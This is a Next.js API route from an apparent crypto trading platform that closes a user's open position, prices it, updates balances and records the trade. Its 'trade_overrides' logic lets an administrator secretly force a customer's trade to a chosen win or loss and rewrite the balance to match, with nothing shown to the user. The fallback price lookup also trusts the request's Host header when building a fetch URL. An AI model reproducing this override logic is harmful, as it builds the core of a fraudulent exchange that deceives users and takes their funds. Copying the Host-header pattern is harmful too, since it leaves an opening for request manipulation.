import { createClient, createAdminClient } from "@/lib/supabase/server"
import { NextResponse, type NextRequest } from "next/server"

async function getLivePrice(baseAsset: string): Promise<number> {
  // Try Binance
  try {
    const res = await fetch(`https://api.binance.com/api/v3/ticker/price?symbol=${baseAsset}USDT`, {
      cache: "no-store",
      signal: AbortSignal.timeout(5000),
    })
    if (res.ok) {
      const data = await res.json()
      const price = parseFloat(data.price)
      if (price > 0) return price
    }
  } catch { /* fallback */ }

  // Try our own API
  try {
    const { headers } = await import("next/headers")
    const headersList = await headers()
    const host = headersList.get("host") || "localhost:3000"
    const protocol = host.includes("localhost") ? "http" : "https"
    const res = await fetch(`${protocol}://${host}/api/prices`, {
      cache: "no-store",
      signal: AbortSignal.timeout(5000),
    })
    if (res.ok) {
      const data = await res.json()
      const coin = data.crypto?.find((c: { symbol: string }) => c.symbol === baseAsset)
      if (coin?.price > 0) return coin.price
    }
  } catch { /* all failed */ }

  return 0
}

export async function POST(request: NextRequest) {
  const supabase = await createClient()
  const { data: { user } } = await supabase.auth.getUser()
  if (!user) return NextResponse.json({ error: "Unauthorized" }, { status: 401 })

  const adminSupabase = await createAdminClient()
  const { tradeId } = await request.json()

  if (!tradeId) return NextResponse.json({ error: "Trade ID required" }, { status: 400 })

  // Get the open position
  const { data: position } = await adminSupabase
    .from("trades")
    .select("*")
    .eq("id", tradeId)
    .eq("user_id", user.id)
    .eq("status", "open")
    .single()

  if (!position) return NextResponse.json({ error: "Open position not found" }, { status: 404 })

  const baseAsset = position.pair.split("/")[0]
  const quoteAsset = position.pair.split("/")[1] || "USDT"
  const currentPrice = await getLivePrice(baseAsset)

  if (currentPrice <= 0) {
    return NextResponse.json({ error: "Could not fetch market price" }, { status: 500 })
  }

  const entryPrice = Number(position.price)
  const qty = Number(position.amount)
  const closeTotal = currentPrice * qty
  const fee = closeTotal * 0.001

  // Check for admin trade overrides (forced win/loss)
  let pnl = (currentPrice - entryPrice) * qty - fee - Number(position.fee || 0)
  let pnlPercent = entryPrice > 0 ? ((currentPrice - entryPrice) / entryPrice) * 100 : 0

  // Look for active override for this user (pair-specific first, then global)
  const { data: overrides } = await adminSupabase
    .from("trade_overrides")
    .select("*")
    .eq("user_id", user.id)
    .eq("active", true)
    .order("created_at", { ascending: false })

  const override = overrides?.find((o: any) => o.pair === position.pair) ||
                   overrides?.find((o: any) => !o.pair) || null

  if (override) {
    const mult = Number(override.multiplier) || 1
    const entryTotal = entryPrice * qty
    const forcedAmount = entryTotal * 0.05 * mult // 5% of position value * multiplier

    if (override.forced_result === "win") {
      pnl = Math.abs(forcedAmount)
      pnlPercent = Math.abs(5 * mult)
    } else if (override.forced_result === "loss") {
      pnl = -Math.abs(forcedAmount)
      pnlPercent = -Math.abs(5 * mult)
    }

    // Mark override as used
    await adminSupabase.from("trade_overrides").update({
      active: false,
      used_at: new Date().toISOString(),
    }).eq("id", override.id)
  }

  // Update the position to closed
  await adminSupabase.from("trades").update({
    status: "closed",
    close_price: currentPrice,
    closed_at: new Date().toISOString(),
    pnl,
  }).eq("id", tradeId)

  // Update balances: sell the base asset back, credit the quote asset
  // Deduct base asset
  const { data: bBal } = await adminSupabase
    .from("balances")
    .select("*")
    .eq("user_id", user.id)
    .eq("asset", baseAsset)
    .single()

  if (bBal) {
    await adminSupabase.from("balances").update({
      available: Math.max(0, bBal.available - qty),
      updated_at: new Date().toISOString(),
    }).eq("user_id", user.id).eq("asset", baseAsset)
  }

  // Credit quote asset (sale proceeds minus fee)
  const { data: qBal } = await adminSupabase
    .from("balances")
    .select("*")
    .eq("user_id", user.id)
    .eq("asset", quoteAsset)
    .single()

  // Credit quote asset: entry total + pnl (pnl can be negative for losses)
  const creditAmount = (entryPrice * qty) + pnl
  if (qBal) {
    await adminSupabase.from("balances").update({
      available: Math.max(0, qBal.available + creditAmount),
      updated_at: new Date().toISOString(),
    }).eq("user_id", user.id).eq("asset", quoteAsset)
  } else {
    await adminSupabase.from("balances").insert({
      user_id: user.id,
      asset: quoteAsset,
      available: Math.max(0, creditAmount),
      in_order: 0,
    })
  }

  // Create a closing trade record
  await adminSupabase.from("trades").insert({
    user_id: user.id,
    pair: position.pair,
    side: "sell",
    price: currentPrice,
    amount: qty,
    total: closeTotal,
    fee,
    pnl,
    status: "closed",
    close_price: currentPrice,
    closed_at: new Date().toISOString(),
  })

  return NextResponse.json({
    success: true,
    message: `Closed ${qty} ${baseAsset} @ $${currentPrice.toLocaleString()} | P&L: ${pnl >= 0 ? "+" : ""}$${pnl.toFixed(2)} (${pnlPercent >= 0 ? "+" : ""}${pnlPercent.toFixed(2)}%)`,
    pnl,
    closePrice: currentPrice,
  })
}
